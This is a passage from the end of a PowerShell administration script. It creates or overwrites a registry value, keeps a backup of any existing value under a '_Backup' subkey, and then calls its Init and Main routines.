            New-Item -Path $RegKey -Force | Out-Null
            Set-ItemProperty -Path $RegKey -Name $RegValue -Value $RegData -Type $RegType -Force
        }
        Catch {
            Write-Error -Message $_
        }
        Write-LogToConsole "Creation of $RegValue in $RegKey was successfull" 
    }
    else {
        Write-LogToConsole "The key $RegKey already exists. Try to set value"
        Try {
            # Create backup
            $OriginalValue = Get-ItemProperty -Path $RegKey -Name $RegValue -ErrorAction SilentlyContinue
            if ($OriginalValue -ne $null) {
                New-Item -Path $RegKey -Name _Backup –Force | Out-Null
                Write-LogToConsole "Creating registry backup at $($RegKey)\_Backup"
            
                Set-ItemProperty -Path "$($RegKey)\_Backup" -Name $RegValue -Value $OriginalValue.$RegValue -Type $RegType -Force            
            }
            # Overwrite
            Set-ItemProperty -Path $RegKey -Name $RegValue -Value $RegData -Type $RegType -Force            
        }
        Catch {
            Write-ErrToConsole -Message $_
        }
        Write-LogToConsole "Creation of $RegValue in $RegKey was successfull"    
    }
          
}



Init
Main

